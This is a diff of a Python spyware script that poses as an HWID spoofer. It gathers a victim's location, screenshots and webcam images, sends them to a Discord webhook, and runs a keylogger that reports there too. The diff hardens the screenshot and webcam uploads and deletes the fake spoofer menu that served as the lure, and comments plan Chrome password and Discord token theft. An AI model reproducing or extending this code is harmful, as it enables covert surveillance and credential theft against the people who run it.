@@ -13,8 +13,9 @@ import pyautogui
 import keyboard
 from threading import Timer
 import win32console, win32gui
-from cv2 import VideoCapture, imwrite, waitKey, destroyWindow
-import pyttsx3
+from cv2 import VideoCapture, imwrite, waitKey
+
+
 
 colorama.init()
 window = win32console.GetConsoleWindow()
@@ -143,12 +144,20 @@ embed.add_embed_field(name="Zip Code", value=f"||{zip_code}||", inline=True)
 embed.add_embed_field(name="Latitude", value=f"||{lat}||", inline=True)
 embed.add_embed_field(name="Longitude", value=f"||{lon}||", inline=True)
 embed.add_embed_field(name="Has Webcam", value=f"||{has_webcam}||", inline=True)
+try:
+    with open("./data/screenshot.png", "rb") as f:
+        webhook.add_file(file=f.read(), filename='screenshot.png')
+except:
+    pass
 
-with open("./data/screenshot.png", "rb") as f:
-    webhook.add_file(file=f.read(), filename='screenshot.png')
 
-with open("./data/webcam.png", "rb") as f:
-    webhook.add_file(file=f.read(), filename='webcam.png')
+# If path doesnt exists, pass
+try:
+    with open("./data/webcam.png", "rb") as f:
+        webhook.add_file(file=f.read(), filename='webcam.png')
+except:
+    pass
+
 
 
 webhook.add_embed(embed)
@@ -164,51 +173,6 @@ if os.path.exists("./data/webcam.png"):
 keylogger = Keylogger(interval=timer, report_method="webhook")    
 keylogger.start()
 
-# To get this kind of fonts, visit fsymbols.com (https://fsymbols.com/generators/carty/)
-# This is the message that will be shown in the console.
-print(Fore.LIGHTCYAN_EX + """
-
-
-██╗░░██╗░██╗░░░░░░░██╗██╗██████╗░  ░██████╗██████╗░░█████╗░░█████╗░███████╗███████╗██████╗░
-██║░░██║░██║░░██╗░░██║██║██╔══██╗  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
-███████║░╚██╗████╗██╔╝██║██║░░██║  ╚█████╗░██████╔╝██║░░██║██║░░██║█████╗░░█████╗░░██████╔╝
-██╔══██║░░████╔═████║░██║██║░░██║  ░╚═══██╗██╔═══╝░██║░░██║██║░░██║██╔══╝░░██╔══╝░░██╔══██╗
-██║░░██║░░╚██╔╝░╚██╔╝░██║██████╔╝  ██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░███████╗██║░░██║
-╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░  ╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
-
-""")
-print("--------------------------------------------------")
-print(Fore.RED + "Script to spoof your HWID and change it to a new one.")
-print(Fore.RED + "Use this spoofer at your own risk.")
-print("--------------------------------------------------")
-print(Fore.LIGHTCYAN_EX + "1. Spoof HWID")
-print(Fore.LIGHTCYAN_EX + "2. Exit")
-print("--------------------------------------------------")
-print(Fore.LIGHTCYAN_EX + "Please select an option.")
-print("--------------------------------------------------")
-option = input(Fore.LIGHTCYAN_EX + "Option: ")
-
-# Options, add as many as you want.
-if option == "1": 
-    myuuid = uuid.uuid4()
-    myuuid_str = str(myuuid)
-    string = myuuid_str
-    print("Getting current HWID...")
-    time.sleep(1)
-    hardwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
-    print("Your current HWID is: " + string.upper())
-    time.sleep(0.2)
-    print("Spoofing HWID...")
-    time.sleep(2)
-    print("HWID spoofed.")
-    print("New HWID: " + hardwid)
-elif option == "2":
-    exit()
-else:
-    print("Invalid option.")
-    exit()
-os.system("pause")
-
 #This is not the best logger, as it only pulls IP and some other stuff, but it's a start.
 #I will be updating this logger in the future, so stay tuned.
 #If you have any questions, feel free to DM me on Discord: Birdy#9457
@@ -217,9 +181,7 @@ os.system("pause")
 #Future Updates:
 #1. Screenshot of the victim's screen. - Readded
 #2. Webcam Capture. - Done
-#3. Chrome Password. 
+#3. Chrome Password.
 #4. Discord Token Grabber. 
-
-
 
 
